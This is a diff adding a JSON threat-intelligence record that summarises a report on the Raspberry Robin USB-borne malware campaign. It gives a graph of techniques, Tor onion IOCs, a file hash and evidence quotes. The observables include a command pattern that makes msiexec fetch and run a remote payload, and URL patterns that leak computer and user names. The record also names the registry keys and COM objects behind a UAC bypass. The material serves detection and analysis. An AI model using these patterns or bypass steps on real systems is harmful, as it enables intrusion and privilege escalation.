@@ -1,0 +1,174 @@
+{
+  "report_id": "trendmicro_raspberry_robin_2022_12_20",
+  "title": "Raspberry Robin Malware Targets Telecom, Governments",
+  "source": "Trend Micro",
+  "author": "Christopher So",
+  "published_date": "2022-12-20",
+  "malware_family": "Raspberry Robin",
+  "aliases": [
+    "Backdoor.Win32.RASPBERRYROBIN.A"
+  ],
+  "summary": "Raspberry Robin is a multi-stage malware campaign using infected USB-delivered LNK files to launch legitimate Windows utilities that retrieve MSI payloads, followed by heavy obfuscation, fake-payload anti-analysis behavior, persistence, privilege escalation via COM/UAC bypass, and Tor-based communications.",
+  "nodes": [
+    {"id": "Raspberry Robin", "type": "malware"},
+    {"id": "Trend Micro", "type": "organization"},
+    {"id": "Red Canary", "type": "organization"},
+    {"id": "Telecommunications", "type": "sector"},
+    {"id": "Government", "type": "sector"},
+    {"id": "Latin America", "type": "region"},
+    {"id": "Australia", "type": "region"},
+    {"id": "Europe", "type": "region"},
+    {"id": "USB", "type": "artifact"},
+    {"id": ".lnk file", "type": "artifact"},
+    {"id": "cmd.exe", "type": "process"},
+    {"id": "msiexec.exe", "type": "process"},
+    {"id": "wmic.exe", "type": "process"},
+    {"id": "MSI package", "type": "artifact"},
+    {"id": "Tor network", "type": "infrastructure"},
+    {"id": "Tor client", "type": "component"},
+    {"id": "Shared memory", "type": "ipc"},
+    {"id": "Session 0", "type": "concept"},
+    {"id": "Privilege Escalation", "type": "behavior"},
+    {"id": "Defense Evasion", "type": "behavior"},
+    {"id": "Persistence", "type": "behavior"},
+    {"id": "Command Execution", "type": "behavior"},
+    {"id": "Registry RunOnce", "type": "registry_key"},
+    {"id": "Registry RunOnceEx", "type": "registry_key"},
+    {"id": "ICM Calibration DisplayCalibrator", "type": "registry_key"},
+    {"id": "CMLuaUtil", "type": "com_object"},
+    {"id": "ColorDataProxy", "type": "com_object"},
+    {"id": "DCCW.exe", "type": "process"},
+    {"id": "ODBCCONF.EXE", "type": "process"},
+    {"id": "rundll32.exe", "type": "process"},
+    {"id": "dllhost.exe", "type": "process"},
+    {"id": "regsvr32.exe", "type": "process"},
+    {"id": "BrowserAssistant", "type": "payload"},
+    {"id": "RC4", "type": "crypto"},
+    {"id": "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Media\\Active", "type": "registry_value"},
+    {"id": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "type": "registry_key"},
+    {"id": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx", "type": "registry_key"},
+    {"id": "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\ICM\\Calibration\\DisplayCalibrator", "type": "registry_value"},
+    {"id": "T1548", "type": "attack_technique"},
+    {"id": "ucmDccwCOMMethod", "type": "uac_bypass_method"},
+    {"id": "AutoElevate backdoor", "type": "mechanism"},
+    {"id": "LockBit", "type": "threat_group_or_family"}
+  ],
+  "edges": [
+    {"from": "Raspberry Robin", "to": "Telecommunications", "relation": "TARGETS"},
+    {"from": "Raspberry Robin", "to": "Government", "relation": "TARGETS"},
+    {"from": "Raspberry Robin", "to": "Latin America", "relation": "OBSERVED_IN"},
+    {"from": "Raspberry Robin", "to": "Australia", "relation": "OBSERVED_IN"},
+    {"from": "Raspberry Robin", "to": "Europe", "relation": "OBSERVED_IN"},
+    {"from": "Raspberry Robin", "to": "USB", "relation": "SPREADS_VIA"},
+    {"from": "Raspberry Robin", "to": ".lnk file", "relation": "USES"},
+    {"from": ".lnk file", "to": "cmd.exe", "relation": "EXECUTES"},
+    {"from": "cmd.exe", "to": "msiexec.exe", "relation": "LAUNCHES"},
+    {"from": "cmd.exe", "to": "wmic.exe", "relation": "ALTERNATIVE_LAUNCH"},
+    {"from": "msiexec.exe", "to": "MSI package", "relation": "DOWNLOADS"},
+    {"from": "Raspberry Robin", "to": "Defense Evasion", "relation": "PERFORMS"},
+    {"from": "Raspberry Robin", "to": "Persistence", "relation": "PERFORMS"},
+    {"from": "Raspberry Robin", "to": "Privilege Escalation", "relation": "PERFORMS"},
+    {"from": "Raspberry Robin", "to": "Tor network", "relation": "CONNECTS_TO"},
+    {"from": "Raspberry Robin", "to": "Tor client", "relation": "EMBEDS"},
+    {"from": "Raspberry Robin", "to": "Shared memory", "relation": "USES"},
+    {"from": "Raspberry Robin", "to": "Session 0", "relation": "CHECKS"},
+    {"from": "Raspberry Robin", "to": "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Media\\Active", "relation": "READS_OR_WRITES"},
+    {"from": "Raspberry Robin", "to": "RC4", "relation": "USES"},
+    {"from": "Raspberry Robin", "to": "BrowserAssistant", "relation": "DROPS"},
+    {"from": "Raspberry Robin", "to": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "relation": "MODIFIES"},
+    {"from": "Raspberry Robin", "to": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx", "relation": "MODIFIES"},
+    {"from": "Raspberry Robin", "to": "rundll32.exe", "relation": "USES"},
+    {"from": "Raspberry Robin", "to": "ODBCCONF.EXE", "relation": "USES"},
+    {"from": "Raspberry Robin", "to": "CMLuaUtil", "relation": "USES"},
+    {"from": "Raspberry Robin", "to": "ColorDataProxy", "relation": "USES"},
+    {"from": "Raspberry Robin", "to": "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\ICM\\Calibration\\DisplayCalibrator", "relation": "MODIFIES"},
+    {"from": "ColorDataProxy", "to": "DCCW.exe", "relation": "LAUNCHES_VIA_CALIBRATION"},
+    {"from": "Raspberry Robin", "to": "T1548", "relation": "IMPLEMENTS"},
+    {"from": "Raspberry Robin", "to": "ucmDccwCOMMethod", "relation": "USES_VARIATION_OF"},
+    {"from": "ucmDccwCOMMethod", "to": "AutoElevate backdoor", "relation": "ABUSES"},
+    {"from": "Raspberry Robin", "to": "LockBit", "relation": "POSSIBLE_TECHNIQUE_OVERLAP"}
+  ],
+  "observables": [
+    {
+      "type": "command_line_pattern",
+      "value": "cmd.exe /c start msiexec {URL}"
+    },
+    {
+      "type": "url_pattern",
+      "value": "http://{domain}:8080/{random}/{computer_name}"
+    },
+    {
+      "type": "url_pattern",
+      "value": "http://{domain}:8080/{random}/{computer_name}={user_name}"
+    },
+    {
+      "type": "url_pattern",
+      "value": "http://{domain}:8080/{random}/{computer_name}?{user_name}"
+    },
+    {
+      "type": "registry_value",
+      "value": "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Media\\Active = 1"
+    },
+    {
+      "type": "registry_value",
+      "value": "DisplayCalibrator = %User Temp%\\{random file name}.lnk"
+    },
+    {
+      "type": "process_name_options",
+      "value": ["dllhost.exe", "regsvr32.exe", "rundll32.exe"]
+    },
+    {
+      "type": "sha256",
+      "value": "6fb0ad3f756b5d1f871cf34c3e4ea47cb34643cd17709a09c25076c400313adf"
+    }
+  ],
+  "onion_iocs": [
+    "sejnfjrq6szgca7v",
+    "zdfsyv3rubuhpql3",
+    "ihdhoeoovbtgutfm",
+    "tapeucwutvne7l5o",
+    "2qlvvvnhqyda2ahd",
+    "answerstedhctbek",
+    "5j7saze5byfqccf3",
+    "cmgvqnxjoiqthvrc",
+    "3bbaaaccczcbdddz",
+    "sgvtcaew4bxjd7ln",
+    "ugw3zjsayleoamaz",
+    "ynvs3km32u33agwq",
+    "njalladnspotetti",
+    "psychonaut3z5aoz",
+    "habaivdfcyamjhkk",
+    "torwikignoueupfm",
+    "bitmailendavkbec",
+    "cyphdbyhiddenbhs",
+    "clgs64523yi2bkhz",
+    "76qugh5bey5gum7l",
+    "hd37oiauf5uoz7gg",
+    "expressobutiolem",
+    "gl3n4wtekbfaubye",
+    "archivecaslytosk",
+    "kyk55bof3hzdiwrm",
+    "qqvyib4j3fz66nuc",
+    "bcwpy5wca456u7tz",
+    "pornhubthbh7ap3u",
+    "fncuwbiisyh6ak3i"
+  ],
+  "evidence": [
+    {
+      "claim": "Raspberry Robin spreads via infected USB using .lnk files.",
+      "evidence_text": "The campaign and malware ... seemingly spreads to systems with worm-like capabilities (due to the use of .lnk files) via an infected USB."
+    },
+    {
+      "claim": "The malware downloads an MSI payload through legitimate Windows executables.",
+      "evidence_text": "The LNK file contains a command line that runs a legitimate executable to download a Windows Installer (MSI) package ... usually msiexec.exe, but wmic.exe in other samples."
+    },
+    {
+      "claim": "The malware performs UAC bypass through a variation of ucmDccwCOMMethod using elevated COM interfaces and registry calibration settings.",
+      "evidence_text": "It executes the dropped copy as Administrator using a UAC bypass technique ... variation of ucmDccwCOMMethod ... creates an elevated COM object for CMLuaUtil ... sets DisplayCalibrator ... calls LaunchDccw."
+    },
+    {
+      "claim": "The real payload connects to Tor through an injected client process.",
+      "evidence_text": "The real payload attempts to connect to the hard-coded Tor addresses ... randomly selects a name among dllhost.exe, regsvr32.exe, rundll32.exe ... injects the code of the Tor client."
+    }
+  ]
+}
